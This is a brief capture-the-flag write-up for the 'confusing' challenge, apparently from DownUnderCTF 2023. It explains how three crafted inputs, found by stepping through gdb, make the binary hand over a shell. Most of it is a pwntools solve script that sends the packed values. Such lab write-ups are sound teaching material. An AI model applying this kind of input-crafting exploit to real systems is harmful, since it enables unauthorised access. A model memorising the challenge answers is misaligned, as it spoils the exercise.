# confusing

This challenge needs three correct inputs and it gives us a shell. Originally, I tried to use `angr` to solve it but gave up on that and just stepped through `gdb` to figure out how the inputs were being handled in memory.

```python
from pwn import *
context.arch = "amd64"

# -1 and 13337
first = 0x12ffffffff3419
# GALF in ascii
second = 1195461702
# the large double
third = 0x3ff9e3779b9486e5

io = process("./confusing")
# io = remote("2023.ductf.dev", 30024)

if args.GDB:
	gdbscript="""
	b confusing.c:27
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)

io.sendlineafter(b"d: ", str(first).encode())
io.sendlineafter(b"s: ", str(second).encode())
io.sendlineafter(b"f: ", p64(third))

io.interactive()
```